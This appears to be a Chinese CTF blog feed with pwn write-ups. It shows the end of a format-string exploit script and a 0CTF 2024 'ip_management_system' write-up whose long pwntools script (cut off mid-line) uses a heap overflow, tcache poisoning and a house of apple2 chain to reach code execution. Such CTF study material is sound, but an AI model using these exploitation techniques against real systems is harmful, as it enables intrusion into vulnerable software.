class="line">fmt(stack3_low, offset_stack1)</span><br><span class="line">fmt(low1, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">1</span>, offset_stack1)</span><br><span class="line">fmt(low2, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">2</span>, offset_stack1)</span><br><span class="line">fmt(low3, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">3</span>, offset_stack1)</span><br><span class="line">fmt(low4, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">4</span>, offset_stack1)</span><br><span class="line">fmt(low5, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">5</span>, offset_stack1)</span><br><span class="line">fmt(low6, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">6</span>, offset_stack1)</span><br><span class="line">fmt(<span class="number">0</span>, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">7</span>, offset_stack1)</span><br><span class="line">fmt(<span class="number">0</span>, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">8</span>, offset_stack1)</span><br><span class="line">fmt(<span class="number">0</span>, offset_stack2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret-&gt;pop_r12&quot;</span>)</span><br><span class="line">pop_r12 = libc_base + <span class="number">0x2f709</span></span><br><span class="line">hack_addr = pop_r12</span><br><span class="line">low1 = hack_addr &amp; <span class="number">0xff</span></span><br><span class="line">low2 = hack_addr &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">low3 = hack_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span></span><br><span class="line">low4 = hack_addr &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span></span><br><span class="line">low5 = hack_addr &gt;&gt; <span class="number">32</span> &amp; <span class="number">0xff</span></span><br><span class="line">low6 = hack_addr &gt;&gt; <span class="number">40</span> &amp; <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hack_addr:&quot;</span>, <span class="built_in">hex</span>(hack_addr))</span><br><span class="line">fmt(stack3_low, offset_stack1)</span><br><span class="line">fmt(ret_low, offset_stack2)</span><br><span class="line"><span class="comment"># p.sendafter(b&#x27;Welcome&#x27;,(&#x27;%&#123;&#125;$p&#x27;.format(offset_stack3)).encode().ljust(0x50,b&#x27;\x00&#x27;))</span></span><br><span class="line">fmt(low1, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">1</span>, offset_stack2)</span><br><span class="line">fmt(low2, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">2</span>, offset_stack2)</span><br><span class="line">fmt(low3, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">3</span>, offset_stack2)</span><br><span class="line">fmt(low4, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">4</span>, offset_stack2)</span><br><span class="line">fmt(low5, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">5</span>, offset_stack2)</span><br><span class="line">fmt(low6, offset_stack3)</span><br><span class="line"></span><br><span class="line">ret_addr = ret_addr + <span class="number">0x10</span></span><br><span class="line">hack_addr = ret_addr</span><br><span class="line">ret_low = ret_addr &amp; <span class="number">0xff</span></span><br><span class="line">low1 = hack_addr &amp; <span class="number">0xff</span></span><br><span class="line">low2 = hack_addr &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">low3 = hack_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span></span><br><span class="line">low4 = hack_addr &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span></span><br><span class="line">low5 = hack_addr &gt;&gt; <span class="number">32</span> &amp; <span class="number">0xff</span></span><br><span class="line">low6 = hack_addr &gt;&gt; <span class="number">40</span> &amp; <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hack_addr:&quot;</span>, <span class="built_in">hex</span>(hack_addr))</span><br><span class="line"></span><br><span class="line">fmt(stack3_low, offset_stack1)</span><br><span class="line">fmt(low1, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">1</span>, offset_stack1)</span><br><span class="line">fmt(low2, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">2</span>, offset_stack1)</span><br><span class="line">fmt(low3, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">3</span>, offset_stack1)</span><br><span class="line">fmt(low4, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">4</span>, offset_stack1)</span><br><span class="line">fmt(low5, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">5</span>, offset_stack1)</span><br><span class="line">fmt(low6, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">6</span>, offset_stack1)</span><br><span class="line">fmt(<span class="number">0</span>, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">7</span>, offset_stack1)</span><br><span class="line">fmt(<span class="number">0</span>, offset_stack2)</span><br><span class="line">fmt(stack3_low + <span class="number">8</span>, offset_stack1)</span><br><span class="line">fmt(<span class="number">0</span>, offset_stack2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret-&gt;onegadget&quot;</span>)</span><br><span class="line"><span class="comment"># pop_r12 = libc_base + 0x2f709</span></span><br><span class="line">hack_addr = onegadget</span><br><span class="line">low1 = hack_addr &amp; <span class="number">0xff</span></span><br><span class="line">low2 = hack_addr &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xff</span></span><br><span class="line">low3 = hack_addr &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xff</span></span><br><span class="line">low4 = hack_addr &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xff</span></span><br><span class="line">low5 = hack_addr &gt;&gt; <span class="number">32</span> &amp; <span class="number">0xff</span></span><br><span class="line">low6 = hack_addr &gt;&gt; <span class="number">40</span> &amp; <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hack_addr:&quot;</span>, <span class="built_in">hex</span>(hack_addr))</span><br><span class="line">fmt(stack3_low, offset_stack1)</span><br><span class="line">fmt(ret_low, offset_stack2)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome&#x27;</span>,(<span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(offset_stack3)).encode().ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fmt(low1, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">1</span>, offset_stack2)</span><br><span class="line">fmt(low2, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">2</span>, offset_stack2)</span><br><span class="line">fmt(low3, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">3</span>, offset_stack2)</span><br><span class="line">fmt(low4, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">4</span>, offset_stack2)</span><br><span class="line">fmt(low5, offset_stack3)</span><br><span class="line">fmt(ret_low + <span class="number">5</span>, offset_stack2)</span><br><span class="line">fmt(low6, offset_stack3)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;Welcome&#x27;</span>, <span class="string">b&#x27;exit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>PCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>0ctf_2024</title>
    <url>/202412/24/0ctf-2024/</url>
    <content><![CDATA[<h1 id="0CTF-2024-PWN-WP"><a href="#0CTF-2024-PWN-WP" class="headerlink" title="0CTF 2024 PWN WP"></a>0CTF 2024 PWN WP</h1><h2 id="ip-management-system"><a href="#ip-management-system" class="headerlink" title="ip_management_system"></a>ip_management_system</h2><p>漏洞在add&#x2F;delete ip时使用子网掩码，会把start ip后几位按照掩码清零，而且没有检查造成的向上溢出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202412/24/0ctf-2024/image-20241224085004256.png"
                      alt="image-20241224085004256"
                ></p>
<p>所以先常规泄露heap地址，然后上溢修改size，使tcache链入两个chunk，再上溢修改size，将上方的chunk size改大，free后malloc即可造成堆重叠，最后修改fd，实现任意地址分配。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202412/24/0ctf-2024/image-20241224085733123.png"
                      alt="image-20241224085733123"
                ></p>
<p>实现任意分配</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202412/24/0ctf-2024/image-20241224085842633.png"
                      alt="image-20241224085842633"
                ></p>
<p>由于此时没有libc，所以选择打tcache结构体，然后先malloc一个大于0x500的chunk，然后将tcache中任一size的chunk指向他，将他free掉，再malloc回来即可leak libc</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202412/24/0ctf-2024/image-20241224090030586.png"
                      alt="image-20241224090030586"
                ></p>
<p>同时因为程序没有exit等触发io流的函数，打stdout的话，由于任意读写只能一个bit一个bit的读写，也无法成功。因此选择打__malloc_assert触发的fflush(stderr)，但实际好像是fxprintf触发的</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">__malloc_assert (<span class="type">const</span> <span class="type">char</span> *assertion, <span class="type">const</span> <span class="type">char</span> *file, <span class="type">unsigned</span> <span class="type">int</span> line,</span><br><span class="line">		 <span class="type">const</span> <span class="type">char</span> *function)</span><br><span class="line">&#123;</span><br><span class="line">  (<span class="type">void</span>) __fxprintf (<span class="literal">NULL</span>, <span class="string">&quot;%s%s%s:%u: %s%sAssertion `%s&#x27; failed.\n&quot;</span>,</span><br><span class="line">		     __progname, __progname[<span class="number">0</span>] ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : <span class="string">&quot;&quot;</span>, function ? <span class="string">&quot;: &quot;</span> : <span class="string">&quot;&quot;</span>,</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (<span class="built_in">stderr</span>);</span><br><span class="line">  <span class="built_in">abort</span> ();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>链子用的是house of apple2，值得一提的是，由于读写非常不方便，因此需要经可能缩减payload和读写次数，否则远程极易超时</p>
<p>然后将top_chunk改成奇怪的大小，malloc就能触发__malloc_assert</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202412/24/0ctf-2024/image-20241224090704587.png"
                      alt="image-20241224090704587"
                ></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;122&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">gift.libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">libc = gift.libc</span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    <span class="comment"># 设置代理 (HTTP 代理转为 SOCKS5 模式)</span></span><br><span class="line">    proxy_host = <span class="string">&quot;instance.penguin.0ops.sjtu.cn&quot;</span></span><br><span class="line">    proxy_port = <span class="number">18081</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 目标主机和端口</span></span><br><span class="line">    target_host = <span class="string">&quot;7bw2ftmpycgv7k6m&quot;</span></span><br><span class="line">    target_port = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 设置 socket 代理</span></span><br><span class="line">    s = socks.socksocket()</span><br><span class="line">    s.set_proxy(socks.HTTP, proxy_host, proxy_port)</span><br><span class="line">    s.connect((target_host, target_port))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用 pwntools 的包装功能</span></span><br><span class="line">    gift.io = remote.fromsocket(s)</span><br><span class="line">    <span class="comment"># addr = &#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># host = addr.split(&#x27; &#x27;)</span></span><br><span class="line">    <span class="comment"># gift.io = remote(host[0], host[1])</span></span><br><span class="line">    gift.remote = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> local_flag == <span class="string">&quot;nodbg&quot;</span>:</span><br><span class="line">        gift.remote = <span class="literal">True</span></span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">context.log_level = <span class="string">&#x27;warn&#x27;</span></span><br><span class="line">gift.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">input_after_this = <span class="string">b&#x27;Choose an option:&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">h2ip</span>(<span class="params">hex_ip</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(hex_ip, <span class="built_in">int</span>):</span><br><span class="line">        hex_ip = <span class="string">f&quot;<span class="subst">&#123;hex_ip:08x&#125;</span>&quot;</span></span><br><span class="line">    <span class="comment"># 将十六进制按 2 位分隔为 4 段，每段转换为十进制</span></span><br><span class="line">    octets = [<span class="built_in">str</span>(<span class="built_in">int</span>(hex_ip[i : i + <span class="number">2</span>], <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_ip), <span class="number">2</span>)]</span><br><span class="line">    <span class="comment"># 用 &quot;.&quot; 连接成 IPv4 地址</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;.&quot;</span>.join(octets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ip2h</span>(<span class="params">ipv4</span>):</span><br><span class="line">    <span class="comment"># 将 IPv4 地址按 &quot;.&quot; 分割为 4 段</span></span><br><span class="line">    parts = ipv4.split(<span class="string">&quot;.&quot;</span>)</span><br><span class="line">    <span class="comment"># 每段转换为两位的十六进制字符串并拼接</span></span><br><span class="line">    hex_ip = <span class="string">&#x27;&#x27;</span>.join(<span class="string">f&#x27;<span class="subst">&#123;<span class="built_in">int</span>(part):02X&#125;</span>&#x27;</span> <span class="keyword">for</span> part <span class="keyword">in</span> parts)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(hex_ip.lower(), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_set</span>(<span class="params">start, end</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;start ip&#x27;</span>, start)</span><br><span class="line">    sla(<span class="string">b&#x27;end ip&#x27;</span>, end)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_ip</span>(<span class="params">*args</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">1</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;ip&#x27;</span>, args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;ip&#x27;</span>, <span class="string">f&quot;<span class="subst">&#123;args[<span class="number">0</span>]&#125;</span>-<span class="subst">&#123;args[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele_ip</span>(<span class="params">*args</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(args) == <span class="number">1</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;ip&#x27;</span>, args[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(<span class="string">b&#x27;ip&#x27;</span>, <span class="string">f&quot;<span class="subst">&#123;args[<span class="number">0</span>]&#125;</span>-<span class="subst">&#123;args[<span class="number">1</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">querp_ip</span>(<span class="params">ip</span>):</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;ip&#x27;</span>, ip)</span><br><span class="line">    ru(<span class="string">b&#x27;IP&#x27;</span>)</span><br><span class="line">    r = ru(<span class="string">b&#x27;set&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;not&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_ip</span>():</span><br><span class="line">    sla(input_after_this, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal_size</span>(<span class="params">size, mode=<span class="number">0</span>, start=<span class="number">0</span></span>):</span><br><span class="line">    size = start + (size - <span class="number">1</span> &lt;&lt; <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> mode:</span><br><span class="line">        <span class="keyword">return</span> h2ip(size + <span class="number">0b111</span>)</span><br><span class="line">    <span class="keyword">return</span> h2ip(size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    directory /mnt/f/Documents/CTF/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">    brva 0x152B</span></span><br><span class="line"><span class="string">    # create_set</span></span><br><span class="line"><span class="string">    brva 0x1999</span></span><br><span class="line"><span class="string">    brva 0x15B0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    brva 0x183E</span></span><br><span class="line"><span class="string">    # add</span></span><br><span class="line"><span class="string">    brva 0x1896</span></span><br><span class="line"><span class="string">    # dele</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    # brva 0x1813</span></span><br><span class="line"><span class="string">    # brva 0x17C8</span></span><br><span class="line"><span class="string">    # dis 4</span></span><br><span class="line"><span class="string">    # dis 5</span></span><br><span class="line"><span class="string">    b _exit</span></span><br><span class="line"><span class="string">    b __malloc_assert</span></span><br><span class="line"><span class="string">    b _IO_switch_to_wget_mode</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    set $ip = $rebase(0x4050)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># context.log_level = &#x27;warn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create_set(h2ip(0x0), cal_size(0x8))</span></span><br><span class="line"><span class="comment"># clear_ip()</span></span><br><span class="line">create_set(h2ip(<span class="number">0x0</span>), cal_size(<span class="number">0x8</span>))</span><br><span class="line">clear_ip()</span><br><span class="line"><span class="comment"># create_set(h2ip(0x0), cal_size(0x508))</span></span><br><span class="line"><span class="comment"># clear_ip()</span></span><br><span class="line"><span class="comment"># create_set(h2ip(0x0), cal_size(0x78))</span></span><br><span class="line"><span class="comment"># clear_ip()</span></span><br><span class="line"></span><br><span class="line">create_set(h2ip(<span class="number">0x0</span>), cal_size(<span class="number">0x8</span>))</span><br><span class="line">ip_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x8</span> * <span class="number">5</span>):</span><br><span class="line">    ip_list.append(h2ip(i))</span><br><span class="line">heap_leak = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">    heap_leak.append(<span class="built_in">str</span>(querp_ip(i)))</span><br><span class="line">heap_leak = <span class="string">&#x27;&#x27;</span>.join(heap_leak[::-<span class="number">1</span>])</span><br><span class="line">heap_base = <span class="built_in">int</span>(heap_leak, <span class="number">2</span>) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="comment"># print(heap_leak)</span></span><br><span class="line">log_heap_base_addr(heap_base)</span><br><span class="line">clear_ip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># create_set(h2ip(0x0), cal_size(0x508))</span></span><br><span class="line"><span class="comment"># ip_list = []</span></span><br><span class="line"><span class="comment"># for i in range(0, 0x8 * 6):</span></span><br><span class="line"><span class="comment">#     ip_list.append(h2ip(i))</span></span><br><span class="line"><span class="comment"># libc_leak = []</span></span><br><span class="line"><span class="comment"># for i in ip_list:</span></span><br><span class="line"><span class="comment">#     libc_leak.append(str(querp_ip(i)))</span></span><br><span class="line"><span class="comment"># libc_leak = &#x27;&#x27;.join(heap_leak[::-1])</span></span><br><span class="line"><span class="comment"># libc_base = int(heap_leak, 2)</span></span><br><span class="line"><span class="comment"># clear_ip()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">/20 -0x1FF</span></span><br><span class="line"><span class="string">/</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">s = h2ip(<span class="number">0xCFFF</span> - <span class="number">0xB8</span> - <span class="number">3</span>)  <span class="comment"># 0xCB87</span></span><br><span class="line">create_set(s, cal_size(<span class="number">0x40</span>, start=ip2h(s)))</span><br><span class="line">add_ip(s + <span class="string">&quot;/23&quot;</span>)</span><br><span class="line"></span><br><span class="line">s = h2ip(<span class="number">0xCFFF</span> - <span class="number">0x38</span> - <span class="number">9</span>)  <span class="comment"># 0xCB87</span></span><br><span class="line">create_set(s, cal_size(<span class="number">0x40</span>, start=ip2h(s)))</span><br><span class="line">dele_ip(s + <span class="string">&quot;/22&quot;</span>)</span><br><span class="line"></span><br><span class="line">create_set(s, cal_size(<span class="number">0x10</span>, start=ip2h(s)))</span><br><span class="line">clear_ip()</span><br><span class="line"></span><br><span class="line">create_set(s, cal_size(<span class="number">0x48</span>, start=ip2h(s)))</span><br><span class="line">clear_ip()</span><br><span class="line">s = <span class="string">&quot;0.0.0.189&quot;</span></span><br><span class="line">create_set(s, cal_size(<span class="number">0x148</span>, start=ip2h(s)))</span><br><span class="line">dele_ip(s + <span class="string">&quot;/25&quot;</span>)</span><br><span class="line">clear_ip()</span><br><span class="line"></span><br><span class="line">s = h2ip(<span class="number">0</span>)</span><br><span class="line">create_set(s, cal_size(<span class="number">0x2E8</span>, start=ip2h(s)))</span><br><span class="line"></span><br><span class="line">change_addr = protect_ptr(heap_base + <span class="number">0x3B0</span>, heap_base + <span class="number">0xB0</span>)</span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:048b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(change_byte)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(<span class="number">0x880</span> + i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dele_ip(h2ip(<span class="number">0x880</span> + i))</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;0.0.0.189&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x8</span>):</span><br><span class="line">    create_set(s, cal_size(<span class="number">0x150</span> + i * <span class="number">0x10</span>, start=ip2h(s)))</span><br><span class="line">    dele_ip(s + <span class="string">&quot;/25&quot;</span>)</span><br><span class="line">    clear_ip()</span><br><span class="line"></span><br><span class="line">create_set(s, cal_size(<span class="number">0x100</span>, start=ip2h(s)))</span><br><span class="line">clear_ip()</span><br><span class="line"></span><br><span class="line">create_set(s, cal_size(<span class="number">0x508</span>, start=ip2h(s)))</span><br><span class="line">create_set(s, cal_size(<span class="number">0x208</span>, start=ip2h(s)))</span><br><span class="line"></span><br><span class="line">create_set(s, cal_size(<span class="number">0x48</span>, start=ip2h(s)))</span><br><span class="line">s = h2ip(<span class="number">0</span>)</span><br><span class="line">create_set(s, cal_size(<span class="number">0x48</span>, start=ip2h(s)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">change_addr = heap_base + <span class="number">0x12D0</span></span><br><span class="line">change_addr = change_addr &amp; <span class="number">0xFFFF</span></span><br><span class="line"></span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:016b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(change_byte)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(<span class="number">0x0</span> + i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dele_ip(h2ip(<span class="number">0x0</span> + i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># log_heap_base_addr(heap_base)</span></span><br><span class="line">change_addr = heap_base + <span class="number">0xC0</span></span><br><span class="line">change_addr = change_addr &amp; <span class="number">0xFFF</span></span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:012b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="comment"># print(change_byte)</span></span><br><span class="line"><span class="comment"># log_ex(f&quot;len: &#123;len(change_byte)&#125;&quot;)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(<span class="number">64</span> * <span class="number">4</span> + i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dele_ip(h2ip(<span class="number">64</span> * <span class="number">4</span> + i))</span><br><span class="line"></span><br><span class="line">create_set(s, cal_size(<span class="number">0x58</span>, start=ip2h(s)))</span><br><span class="line">clear_ip()</span><br><span class="line">s = h2ip(<span class="number">0</span>)</span><br><span class="line">create_set(s, cal_size(<span class="number">0x508</span>, start=ip2h(s)))</span><br><span class="line"></span><br><span class="line">ip_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">0x8</span> * <span class="number">6</span>):</span><br><span class="line">    ip_list.append(h2ip(i))</span><br><span class="line">libc_leak = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ip_list:</span><br><span class="line">    libc_leak.append(<span class="built_in">str</span>(querp_ip(i)))</span><br><span class="line">libc_leak = <span class="string">&#x27;&#x27;</span>.join(libc_leak[::-<span class="number">1</span>])</span><br><span class="line">libc_base = <span class="built_in">int</span>(libc_leak, <span class="number">2</span>) - <span class="number">0x21ACE0</span></span><br><span class="line">set_current_libc_base_and_log(libc_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">puts_got = libc_base + <span class="number">0x21A098</span> - <span class="number">8</span></span><br><span class="line">stdout = libc_base + <span class="number">0x21B680</span> + <span class="number">0x100</span></span><br><span class="line">stderr = libc_base + <span class="number">0x21B680</span> + <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">create_set(s, cal_size(<span class="number">0x98</span>, start=ip2h(s)))</span><br><span class="line">change_addr = heap_base + <span class="number">0x19E8</span> - <span class="number">8</span></span><br><span class="line">change_addr = change_addr &amp; <span class="number">0xFFFF</span></span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:016b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(<span class="number">0</span> + i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        dele_ip(h2ip(<span class="number">0</span> + i))</span><br><span class="line"></span><br><span class="line">change_addr = stderr</span><br><span class="line">change_byte = <span class="string">f&quot;<span class="subst">&#123;change_addr:048b&#125;</span>&quot;</span></span><br><span class="line">change_byte = change_byte[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(change_byte)):</span><br><span class="line">    <span class="keyword">if</span> change_byte[i] == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        add_ip(h2ip(<span class="number">9</span> * <span class="number">8</span> * <span class="number">8</span> + i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span 